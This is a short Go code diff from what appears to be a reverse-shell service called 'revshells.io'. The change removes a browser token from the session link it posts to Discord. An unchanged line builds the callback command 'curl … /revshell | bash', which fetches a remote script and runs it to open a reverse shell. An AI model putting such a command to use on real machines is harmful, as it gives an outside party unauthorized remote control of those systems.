@@ -34,7 +34,7 @@ func (d *Discord) SessionCreated(sess *protocol.Session, browserToken, operatorI
 	if !d.Enabled() || sess == nil {
 		return nil
 	}
-	sessionURL := fmt.Sprintf("%s/%s?t=%s", d.PublicURL, sess.ID, browserToken)
+	sessionURL := fmt.Sprintf("%s/%s", d.PublicURL, sess.ID)
 	callback := fmt.Sprintf("curl -fsSL %s/%s/revshell | bash", d.PublicURL, sess.ID)
 	return d.send(discordMessage{
 		Username: "revshells.io",
